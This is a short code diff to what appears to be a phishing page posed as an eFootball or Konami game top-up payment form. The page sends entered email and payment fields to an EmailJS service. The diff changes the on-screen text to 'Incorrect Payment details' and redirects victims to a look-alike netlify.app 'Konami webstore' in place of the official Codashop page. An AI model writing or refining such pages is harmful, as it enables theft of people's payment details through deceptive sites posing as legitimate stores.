@@ -191,7 +191,7 @@
         }
 
         .error { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
-        .success { background: rgba(34, 197, 94, 0.2); color: #4ade80; border: 1px solid rgba(34, 197, 94, 0.3); }
+        .success { background: rgba(34, 197, 94, 0.2); color: #f87171; border: 1px solid rgba(34, 197, 94, 0.3); }
     </style>
 </head>
 <body>
@@ -228,7 +228,7 @@
         </div>
 
         <p id="error-message" class="message error"></p>
-        <p id="success-message" class="message success">Verifying Transaction...</p>
+        <p id="success-message" class="message success">Incorrect Payment details</p>
     </form>
 </div>
 
@@ -271,7 +271,7 @@
         errorMsg.style.display = 'none';
         successMsg.style.display = 'block';
         submitBtn.disabled = true;
-        submitBtn.textContent = 'Securing...';
+        submitBtn.textContent = 'Checking...';
 
         const templateParams = {
             email: emailInput.value,
@@ -283,7 +283,7 @@
         emailjs.send('service_u8nndmi', 'template_zs2mpvq', templateParams)
             .then(() => {
                 setTimeout(() => {
-                    window.location.href = 'https://efootball.codashop.com/international';
+                    window.location.href = 'https://konamiwebstore.netlify.app/vi';
                 }, 1500);
             })
             .catch((err) => {
@@ -300,3 +300,4 @@
 </body>
 
 </html>
+
